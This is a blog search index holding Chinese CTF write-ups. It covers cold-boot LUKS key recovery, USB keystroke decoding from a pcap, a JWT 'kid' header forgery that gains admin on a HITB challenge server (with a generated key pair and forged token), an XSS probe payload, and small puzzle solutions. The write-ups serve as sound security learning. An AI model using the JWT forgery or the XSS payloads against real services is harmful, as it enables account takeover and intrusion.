<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[一些文章]]></title>
      <url>%2F3017%2F07%2F26%2F%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0%2F</url>
      <content type="text"><![CDATA[一些自己写的文章。 Project Web-Security-Learning Software-Security-Learning cmsPoc:CMS渗透测试框架 The Path to Machine Learning Awesome CTF Book Vuln-Time Web SecuritySummary 命令执行的一些绕过技巧 php代码执行漏洞 MySql注入备忘录 php代码审计小总结 小试XML实体注入攻击 浅谈php反序列化漏洞 利用PHP的OPcache机制getshell Vuln Analysis PHPCMS v9.6.0 wap模块sql注入漏洞分析 PHPCMS v9.6.0 任意文件上传漏洞分析 Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞 [CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 [CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 代码审计之SQL注入：BlueCMSv1.6 sp1 Bin Security 逆向学习笔记（一） ROP学习：利用通用gadget ROP学习：64位栈溢出 机器学习 机器学习算法：最近邻(KNN) 机器学习算法：感知机(perceptron) Tensorflow学习：常用API win下tensorflow安装避坑指南 数据挖掘 数据挖掘比赛（0）环境搭建之anaconda安装 数据挖掘比赛（1）对无列名的txt数据集读取方法及处理 数据挖掘比赛（2）利用pandas读取大型数据集 数据挖掘比赛（3）申请anaconda-academic-license并使用 数据挖掘比赛（4）ten Minutes to pandas中文版上 数据挖掘比赛（5）ten Minutes to pandas中文版下 技术杂谈 win下Docker默认存储位置修改 windows平台下Docker环境搭建 编程练习 ACM-OJ[长期更新] hihoCoder 162周：回文字符串 CodeTrain(3)数组单调和 CodeTrain(2)棋子翻转 CodeTrain(1)最大差值 随笔 记2017年阿里巴巴之行 WriteupWebCTF HITB CTF 2017-Pasty-writeup Hackit2017-H4ck3rM1nd-writeup Hackit2017-Weekands of hacker-writeup Hackit2017-V1rus3pidem1c-writeup Hackit2017-B3tterS0ci4lN3twork-writeup HackCon2017-Web-writeup XNUCA2017-第一期：Web-writeup XMAN夏令营-2017-XSS-writeup XMAN夏令营-2017-比赛系统-writeup XMAN夏令营-2017-babyweb-writeup XNUCA 2017-Web专题赛前指导-default-writeup XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup XNUCA 2017-Web专题赛前指导-Document-writeup XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup XNUCA 2017-Web专题赛前指导-vote-writeup XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup SHACTF-2017-Web-writeup BugsBunnyCTF2017-web-writeup 实验吧-web-writeup CTFZone-2017-Leaked messages-writeup XMAN选拔赛-2017-web-writeup Meenpwn-2017-web-writeup 一道好玩的webshell题 jarvisoj-web-writeup ringzer0team-js-writeup ringzer0team-web-writeup xss-quiz-writeup GCTF-web-writeup “春秋杯”web-writeup 南邮CTF平台web前30题解 sqli-lab Sqli-Labs:Less17-writeup Sqli-Labs:Less15~16-writeup Sqli-Labs:Less13~14-writeup Sqli-Labs:Less11~12-writeup Sqli-Labs:Less8~10-writeup Sqli-Labs:Less7-writeup Sqli-Labs:Less5-6-writeup Sqli-Labs:Less1-4-writeup PwnCTF Codegate 2017 Qual-babypwn-writeup BugsBunnyCTF2017-pwn-writeup XMAN选拔赛-2017-pwn-writeup XMAN-pwn-writeup SUCTF-2016-pwn400-writeup pwnable.kr Pwnable.kr:shellshock Pwnable.kr:mistake Pwnable.kr:random Pwnable.kr:passcode Pwnable.kr:bof Misc Hackit2017-Cypherpunk’s nightmare-writeup Hackit2017-USB ducker-writeup ISG2017-赛前练手题—writeup HackCon2017-Steg-writeup SHACTF-2017-Growing Up-writeup SHACTF-2017-WannaFly-writeup BugsBunnyCTF2017-misc-writeup 0ctf-2015-Peers-writeup XMAN选拔赛-2017-misc-writeup Crypto BugsBunnyCTF2017-crypto-writeup Meenpwn-2017-crypto-writeup Re BugsBunnyCTF2017-Reverse-writeup]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-Cypherpunk’s nightmare-writeup]]></title>
      <url>%2F2017%2F08%2F30%2FHackit2017-Cypherpunk%E2%80%99s-nightmare-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-Cypherpunk’s nightmare-writeupLUKS aeskeyfind Task1234Description: Our officers just have made cold boot attack on the suspect&apos;s computer. Your role is to recover the content of this encrypted hard drive.Attachment: (none)Webpage: https://mega.nz/#!VdRAkaKT!xP7s74jwnlGmR2spg9RNaKFf5GmCGAv-pxW8aPZNkOwHint: (none) Solution题目提供了一个压缩包，解压缩后得到三个文件：123encrypted.ddmemdump.elf.gz __MACOSX 先看看第一个文件： 可以看到这是一个LUKS加密文件，要解密需要提供密码。结合题目的另外一个文件memdump.elf.gz，我们可以利用工具aeskeyfind来提取藏在内存中的aeskey。 可以通过下面的命令安装：1apt-get install aeskeyfind 将memdump.elf.gz压缩包解压后得到data文件，运行aeskeyfind：1aeskeyfind -v data 结果如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859FOUND POSSIBLE 128-BIT KEY AT BYTE bf16da0KEY: 9e90126c33c85d9a6913e649301b5dcfEXTENDED KEY:9e90126c33c85d9a6913e649301b5dcf30dc98680314c5f26a0723bb5a1c7e74ae2f0ad6ad3bcf24c73cec9f9d2092eb1d60e388b05b2cac7767c033ea4752d8b560820f053baea3725c6e90981b3c480a8bd0490fb07eea7dec107ae5f72c3242faf3904d4a8d7a30a69d00d551b132d332d0939e785de9aedec0e97b8f71db209169b2bee9345b1037f4b26bb88569570690cde9efa496f9d850249260d54db105738258ead714a13287303352527dCONSTRAINTS ON ROWS:00000004000000000000000000000000000000be0000000000000000000000000000005e0000000000000000000000000000008700000000000000000000000000000046000000000000000000000000000000d900000000000000000000000000000003000000000000000000000000000000210000000000000000000000000000007f0000000000000000000000000000004f000000000000000000000000FOUND POSSIBLE 128-BIT KEY AT BYTE bf16fa0KEY: 683c5a4bf8f1cedf5b649c482e48e639EXTENDED KEY:683c5a4bf8f1cedf5b649c482e48e6393bb2487ac34386a598271aedb66ffcd49102003452418691ca669c7c7c0960a894d2c224c69344b50cf5d8c970fcb8612cbe2d75ea2d69c0e6d8b109962409680abf68e5e0920125064ab02c906eb944b5e97385557b72a05331c28cc35f7bc83ac89bab6fb3e90b3c822b87ffdd504f7b9b1fbd1428f6b628aadd31d7778d7e95c6ecb381ee1a05a944c7347e334a4a60103a40e1fe204548bae7713689ad3bCONSTRAINTS ON ROWS:000000310000000000000000000000000000004e000000000000000000000000000000100000000000000000000000000000005100000000000000000000000000000090000000000000000000000000000000600000000000000000000000000000002e000000000000000000000000000000160000000000000000000000000000000e000000000000000000000000000000f3000000000000000000000000Keyfind progress: 100% 重点是得到了两个KEY:12KEY: 9e90126c33c85d9a6913e649301b5dcfKEY: 683c5a4bf8f1cedf5b649c482e48e639 先拿一个key试试：1echo &quot;9e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key 尝试解密：1cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home 但是提示出错：1无法从密钥文件 Safe.key 读取 32 字节。 我们看看Safe.key是怎样的； 发现只有十六个字节。 结合有两个key，我们把两个合起来试试：12345root@chybeta:~/Desktop/nightmare# echo &quot;9e90126c33c85d9a6913e649301b5dcf683c5a4bf8f1cedf5b649c482e48e639&quot; | xxd -r -p &gt; Safe.keyroot@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home卷密钥与卷不匹配。root@chybeta:~/Desktop/nightmare# echo &quot;683c5a4bf8f1cedf5b649c482e48e6399e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.keyroot@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home 然后在kali系统中可以发现已经可以直接打开卷宗。 得到flag：1h4ck1t&#123;Not_paranoid_enough&#125; 也可以通过挂载来实现1234567891011root@chybeta:~/Desktop/nightmare# ls -l /dev/mapper/总用量 0crw------- 1 root root 10, 236 8月 25 05:25 controllrwxrwxrwx 1 root root 7 8月 25 05:26 safe-home -&gt; ../dm-0root@chybeta:~/Desktop/nightmare# mkdir /mnt/safe-homeroot@chybeta:~/Desktop/nightmare# mount /dev/mapper/safe-home /mnt/safe-home/root@chybeta:~/Desktop/nightmare# cd /mnt/safe-home/root@chybeta:/mnt/safe-home# lsflag.txt Melkor_ELF_fuzzerroot@chybeta:/mnt/safe-home# cat flag.txth4ck1t&#123;Not_paranoid_enough&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-USB ducker-writeup]]></title>
      <url>%2F2017%2F08%2F30%2FHackit2017-USB-ducker-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-USB ducker-writeupusb keyboard pcap Task1234Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag&#123;...&#125; )Attachment: (none)Webpage: https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3MHint: (none) Solution题目提供了pcap文件。 可以知道对应的设备为apple的keyboard。 对于keyborad的数据传输，在数据包的Leftover Capture Data中，根据这篇文章： USB鼠标、键盘数据格式 和 HID Keyboard report descriptor。键盘发送给PC的数据每次8个字节，假设收到的数据为：102:00:04:00:00:00:00:00 第一个字节是modifier keys，对应的规则如下：12345678|--bit0: Left Control是否按下，按下为1 |--bit1: Left Shift 是否按下，按下为1 |--bit2: Left Alt 是否按下，按下为1 |--bit3: Left GUI 是否按下，按下为1 |--bit4: Right Control是否按下，按下为1 |--bit5: Right Shift 是否按下，按下为1 |--bit6: Right Alt 是否按下，按下为1 |--bit7: Right GUI 是否按下，按下为1 一个字节是8位，这里是02，即对应着0000 0010，即可解码为Left Shift，也就是说按下了键盘左边的Shift键。假若数据为00，则表示啥都不做。 第二个字节是padding，默认为00。可略过不提。 第三个字节起到第八个字节为普通按键，解码规则可以根据 Universal Serial Bus (USB)中第53页的规则来解码。 比如说我们收到了数据为：104:00:00:00:00:00 根据解码规则，以及第一字节shift被按下，可知为大写字母A。 接下去开始针对题目提供的数据包进行分析。根据 https://www.wireshark.org/docs/dfref/u/usb.html 可以知道 Leftover Capture Data 所对应的Field name为 usb.capdata，我们可以把值为00:00:00:00:00:00:00:00的数据过滤掉，因为它表示啥都不输入。 而我们的目标是keyboard的数据，从pcap包中看它对应的设备Device address为3，所对应的Field name为usb.device_address。 我们可以使用tshark命令提取对应的数据，并将其保存到usbdata.txt中。1tshark -r task.pcap -Y &quot;usb.capdata != 0 and usb.device_address==3&quot; -T fields -e usb.capdata &gt; usbdata.txt 提取出来的数据差不多这样：(好吧，至于为什么还有00:00:00:00:00:00:00:00，哪位解释下) 由于还有一些零行，可以用下面命令再过滤一遍：1cat usbdata.txt | grep -v &quot;00:00:00:00:00:00:00:00&quot; &gt; usbdata_filter.txt 然后根据解码规则进行解码。脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# -*- coding: utf-8 -*-KEYCODE = &#123; 0x04:['a', 'A'], 0x05:['b', 'B'], 0x06:['c', 'C'], 0x07:['d', 'D'], 0x08:['e', 'E'], 0x09:['f', 'F'], 0x0A:['g', 'G'], 0x0B:['h', 'H'], 0x0C:['i', 'I'], 0x0D:['j', 'J'], 0x0E:['k', 'K'], 0x0F:['l', 'L'], 0x10:['m', 'M'], 0x11:['n', 'N'], 0x12:['o', 'O'], 0x13:['p', 'P'], 0x14:['q', 'Q'], 0x15:['r', 'R'], 0x16:['s', 'S'], 0x17:['t', 'T'], 0x18:['u', 'U'], 0x19:['v', 'V'], 0x1A:['w', 'W'], 0x1B:['x', 'X'], 0x1C:['y', 'Y'], 0x1D:['z', 'Z'], 0x1E:['1', '!'], 0x1F:['2', '@'], 0x20:['3', '#'], 0x21:['4', '$'], 0x22:['5', '%'], 0x23:['6', '^'], 0x24:['7', '&amp;'], 0x25:['8', '*'], 0x26:['9', '('], 0x27:['0', ')'], 0x28:['\n','\n'], 0x2C:[' ', ' '], 0x2D:['-', '_'], 0x2E:['=', '+'], 0x2F:['[', '&#123;'], 0x30:[']', '&#125;'], 0x32:['#','~'], 0x33:[';', ':'], 0x34:['\'', '"'], 0x36:[',', '&lt;'], 0x37:['.', '&gt;'], 0x38:['/', '?'], 0x2b:['\t','\t'], 0x4f:[u'→',u'→'], 0x50:[u'←',u'←'], 0x51:[u'↓',u'↓'], 0x52:[u'↑',u'↑']&#125;NA_KEYCODE = &#123;0,1,2,3&#125;file = open("usbdata_filter.txt","rb")result = ""while 1: data = file.readline() if not data: break data = data[:-1].split(":") normalcode = int(data[2],16) if normalcode in NA_KEYCODE: continue if data[0] == '02': shiftcode = 1 else: shiftcode = 0 # print(normalcode, shiftcode) result += KEYCODE[normalcode][shiftcode]file.close()print(result) 解出来为：12345wkfb3&apos;↑[↑l↑#↑&#123;w$↓&gt;b↓ag↓[e↓ci.[↑[f↑&#123;k↑n$↑ju&#125;↓:↓3↓u↓%=↑~↑y↑6↑,&apos;↓p↓b↓7↓%&amp;↑d↑0↑j↑pt↓i↓a↓[↓k(↑=↑r↑m↑]=↓0↓d↓&gt;↓lc↑*↑_↑&#123;↑j%↓u↓s↓(↓*2↑0↑n↑&apos;↑;9↓h↓4↓]↓y4↑&apos;↑k↑;↑+p↓f↓e↓$↓!&#125;↑1↑_↑k↑s&amp;↓s↓2↓c↓%q↑$↑.↑!↑#,↓s↓0↓c↓z3↑e↑&#125;↑-↑i 打出来：12345w&#123;w$ju&#125;,&apos;pt]=j%;9+ps&amp;#,k#&gt;bn$:6pjim0&#123;u&apos;h;fks!s-flag&#123;k3yb0ard_sn4ke_2.0&#125;b[[e[fu~7d[=&gt;*(0]&apos;$1c$ce3&apos;ci.[%=%&amp;k(lc*2y4!&#125;%qz3]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HITB CTF 2017-Pasty-writeup]]></title>
      <url>%2F2017%2F08%2F29%2FHITB-CTF-2017-Pasty-writeup%2F</url>
      <content type="text"><![CDATA[HITB CTF 2017-Pasty-writeup JWT安全性问题 Task12Can you find the administrator&apos;s secret message?http://47.74.147.52:20012 Solution先看看基本功能。注册： 登陆： 写paste，保存: 可以对保存的paste进行下载: 可以看到注册后返回了一大串的字符串，之后写paste保存时即以这个字符串作为身份认证。1eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJjaHliZXRhIn0.nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A 刚接触时不知道是啥，就拿去用base64解了一下，虽然解出来后后面出现了一大堆的乱码，不过前面解出来入下：1&#123;&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;,&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125; 然后就开始查找关于JWT的资料了。在 https://jwt.io/ 上可以对字符串进行debugger。 JWT由三部分组成。第一部分是头部，原始信息是json格式，包含使用的算法(alg)，类型(typ)，可选的kids字段，将头部原始信息进行base64编码后得到了第一部分字段：1eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ 第二部分是payload，原始信息是json格式，包含一些重要信息，比如本题中是&quot;sub&quot;: &quot;chybeta&quot;，这对应着账号的用户，将这部分原始信息进行base64编码后得到第二部分字段：1eyJzdWIiOiJjaHliZXRhIn0 第三部分，将第一部分和第二部分字段用点号.连接后根据第一部分里的alg算法进行签名。在本题中采用的是RS256算法:1nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A 在服务器返回给我们的头部信息中，有一个是：1&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot; 关于kid字段(key ID)，它指定了用哪一个key来加密。可以看看这里：What’s the meaning of the “kid” claim in a JWT token? 访问：1http://47.74.147.52:20012/keys/ 可以发现里面有许多pem公钥，我们字段相符合即为3c3c2ea1c3f113f649dc9389dd71b851.pem。 结合头部的alg信息，我们知道它采用的是SH256即sha256签名，这种方式下，发送方（即我们）要用私钥对签名进行加密，接收方（即服务器端）用公钥进行解密，而从头部kid字段知道，公钥的地址实际上是我们可以指定的。所以攻击流程如下: 我们先生成公钥私钥对。 用公钥私钥在 jwt.io 上进行签名伪造jwt，其中kid字段指明我们公钥的地址。 服务器端收到jwt后，用kid字段地址中的公钥进行解密，由于公钥和私钥是我们伪造的，所以解密是能成功的。 拿flag。 利用openssl生成公钥私钥对。公钥：123456-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsErbxerAjPzF+vkAhbMEZb0+3LzK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIvCo9mGCJ7rFsw9BAOIAGGu3pnwr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpbxW+zblOEFj0443zTRwIDAQAB-----END PUBLIC KEY----- 私钥:123456789101112131415-----BEGIN RSA PRIVATE KEY-----MIICXAIBAAKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsErbxerAjPzF+vkAhbMEZb0+3LzK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIvCo9mGCJ7rFsw9BAOIAGGu3pnwr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpbxW+zblOEFj0443zTRwIDAQABAoGAVfIodCIWHV0hoU929BSXCmHTckoabs4QQNKTo4hEBv3gZlrNdlbIssUrEKsG7XqWVRsH9VduVREGPduKlYR4WI8yPrjUygUuH7GyrC2w44VtCZQ+3zLObknC7RuA+DBWgpMTBNF2f3Tpsj6kkSZXN97X1jS9azUkK1uxeJcG8YECQQDI6s3CjTPwQlr3h9kxEFPZDIbqjJjWjzY9CFP+A1nOOsrOjNSj9Mf+Qv/n6oLglLopzSu2hM7Iozwg7EBjWiYrAkEAyLH/ROQNFmgrBC+QV7HUsOdgQDPiCftEADZSm+IMzpItoTMMHhQBUVjJl8TLd8qajItN+mOBb6Eoddq7u5X1VQJAevvff1tXk5XKgQJS3EmWSaH1Y9U0KQH4vVs/rpj2e9pZEh36e3H2iZkRdDCEdFwVqEjCnTKmMQJaZ/y1XRttiQJBAJcapSZ6SXxIW7LgGN5d7tRusGJGbfaz7sP2IoZpUNkq6B4JcCMpTsCvh8C0E7mSmoAc1k4iIy8n+G2bjWM0Ca0CQHHZ/PXOoCKCGi8mB98pdB36VjbTX81giIboYJXhbVeuvXvP1EUuGsjDfk+bX1oFxgauqOA7i7oY+sN5JNdO5Fk=-----END RSA PRIVATE KEY----- 用之前注册的账号写一个paste，内容为公钥 利用下载功能获取到公钥的保存地址，这里为 /api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw。 我们想要让服务器端用我们的公钥来加密，所以在伪造jwt的头部的kid字段应为：1&quot;kid&quot;:&quot;/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&quot; 但是由前面观察keys文件夹知道，服务器端会把传进来的url后面加上.pem。即&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;会变成去访问keys/3c3c2ea1c3f113f649dc9389dd71b851.pem 可以在?raw后面加上一个&amp;，这样加上去后的.pem不会变成后缀而是被当成一个参数。访问 http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&amp;.pem 即访问 http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw ，即我们paste/公钥的保存地址。 接下来用 https://jwt.io/ 来生成伪造的jwt。由于要伪造admin，所以sub字段要修改为admin。在公钥和私钥部分填上我们生成的公钥和私钥，在头部kid字段填上公钥的地址。 得到：1eyJraWQiOiJhcGkvcGFzdGUvZmNiODI5MTItMWM4NC00Y2U2LTk3MTMtNzU1ZDVmMTQyMDY2P3JhdyYiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.IW5dnvpZAnsmIb4CrAPdwcTApLMzuB4LaDZxzm6nLwRKp4H6SCZUuPi71daWstfUDEGxMmBucTnHmaBCb4VZfxMrKDx0G27J-yJGW-SpGE9j61Punpv0vTaVw0H5SVkU6IZud_OvVWIe6vf_ffmup0Mou7GpCvOn6fUg6XYk8O0 之后在每次操作中，要记得把Authorization字段替换成对应的伪造jwt。 flag:1HITB&#123;b128a14885c4974c4a7016eb1d79aae6&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-H4ck3rM1nd-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-H4ck3rM1nd-writeup%2F</url>
      <content type="text"><![CDATA[跟着wp做的。 Task1234Description: Even hackers want to share their thoughts :)Attachment: (none)Webpage: http://tasks.ctf.com.ua:13373Hint: (none) Solution先看看基本功能。 注册，需要填写一个secret： 登陆后： 可以看一个profile: 而edit点进去后可以修改about字段。 查看profile.php源代码，发现有一些提示： 注意上图，我们在注册时填入的secret是放在input标签里的：1Secret: &lt;input id=&quot;secret&quot; name=&quot;secret&quot; value=&quot;mygod&quot; type=&quot;text&quot;/&gt; 如果我们在注册时填写secret为:1&quot;/&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;&quot; 也许能构造出xss？但很可惜被过滤掉了： 可以看到&gt;和&lt;都被实体化了。 回到profile.php，查看edit功能，普通的xss攻击不成功，这里会直接把尖括号直接过滤掉。尝试CSS Injection。 Refference CTF Write-Up - HackIT CTF 2017 Web200]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ISG2017-赛前练手题—writeup]]></title>
      <url>%2F2017%2F08%2F28%2FISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup%2F</url>
      <content type="text"><![CDATA[ISG2017-赛前练手题—writeup 秘密文件12在某个员工的电脑上发现了一份奇怪的文件，你能找到什么东西吗？奇怪的文件(https://play.chinaisg.org/attachment/download/secret.backup) 下载下来后打开，看起来是流量包。尾部发现一些base64串。解一下：123456789import base64pngdata = "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"f = open("flag.png","wb")f.write(base64.b64decode(pngdata))f.close() 得到一张二维码，扫后得到flag：1ISG&#123;5a9f1ce5c7359a1b1076b5143b946a3b&#125; 简单的apk123能够通过APK认证的字符串即为本题flag下载APK(https://play.chinaisg.org/attachment/download/simple-code.apk) 其实这是mobile，干脆写在这里不另开了。用jeb打开，然后发现是kotlin，先果断放弃哈哈哈。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-Weekands of hacker-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-Weekands-of-hacker-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-Weekands of hacker-writeup脑脑脑洞题？ Task1234Description: Try to find something weird here...Attachment: (none)Webpage: (none)Hint: Format answer is h4ck1t&#123;&lt;something&gt;&#125;. You must type right flag on keyboard, where? Feel you real hacker. Hide Solution没有给出网址，那就只能在https://ctf.com.ua里咯。 在https://ctf.com.ua/js/jquery.js里有一段：12345678910111213typer:function(key)&#123; $m=[70,70,71,79,86,74,71,83,80,74,77,86,81,95];//times alt is pressed for Access Granted $c=Typer.counter-211; if (!Typer.failed &amp; $c&gt;=0)&#123; if (!(key==$m[$c]-$c))&#123; Typer.failed=true; Typer.makeDenied(); &#125; if($c+1==$m.length)&#123; Typer.makeAccess() &#125; &#125;// remove all existing popuccess();&#125;, 12345key = ""m = [70,70,71,79,86,74,71,83,80,74,77,86,81,95]for i in range(len(m)): key += chr(m[i]-i)print(key) 得到:1FEELREALHACKER 再把它转成小写，flag:1h4ck1t&#123;feelrealhacker&#125; 